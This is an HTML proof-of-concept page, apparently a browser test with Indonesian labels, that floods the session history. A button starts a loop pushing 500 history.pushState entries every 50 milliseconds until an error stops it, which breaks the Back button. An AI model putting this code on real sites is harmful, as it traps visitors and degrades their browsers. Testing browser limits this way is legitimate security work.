<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>History API Flooding Test</title>
<style>
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    background: #0f172a;
    color: #f8fafc;
    padding: 40px;
    text-align: center;
  }
  .card {
    background: #1e293b;
    padding: 32px;
    border-radius: 12px;
    max-width: 500px;
    margin: 0 auto;
    border: 1px solid #334155;
  }
  button {
    background: #ef4444;
    color: white;
    border: none;
    padding: 12px 24px;
    font-size: 16px;
    font-weight: 600;
    border-radius: 8px;
    cursor: pointer;
    margin-top: 16px;
  }
  button:hover { background: #dc2626; }
  #status {
    margin-top: 20px;
    font-family: monospace;
    color: #38bdf8;
    font-size: 14px;
  }
</style>
</head>
<body>

<div class="card">
  <h2>History API Flooding PoC</h2>
  <p>Klik tombol di bawah untuk membanjiri history stack menggunakan <code>history.pushState()</code> secara masif.</p>
  <button id="flood-btn">Mulai History Flood</button>
  <div id="status">Status: Siap diuji. (Perhatikan tombol Back browser setelah dimulai)</div>
</div>

<script>
'use strict';

const floodBtn = document.getElementById('flood-btn');
const statusDiv = document.getElementById('status');
let isFlooding = false;

floodBtn.addEventListener('click', () => {
  if (isFlooding) return;
  isFlooding = true;
  floodBtn.disabled = true;
  floodBtn.style.opacity = '0.5';

  let count = 0;
  statusDiv.textContent = 'Status: Membanjiri history stack...';

  // Memanggil pushState secara intensif dalam interval singkat
  const interval = setInterval(() => {
    try {
      for (let i = 0; i < 500; i++) {
        count++;
        history.pushState({ floodIndex: count }, `Flood ${count}`, `#state-${count}`);
      }
      statusDiv.textContent = `Status: Berhasil memasukkan ${count} state ke history.`;
    } catch (err) {
      clearInterval(interval);
      statusDiv.textContent = `Limit / Error tercapai: ${err.message}`;
      isFlooding = false;
      floodBtn.disabled = false;
      floodBtn.style.opacity = '1';
    }
  }, 50);
});
</script>

</body>
</html>
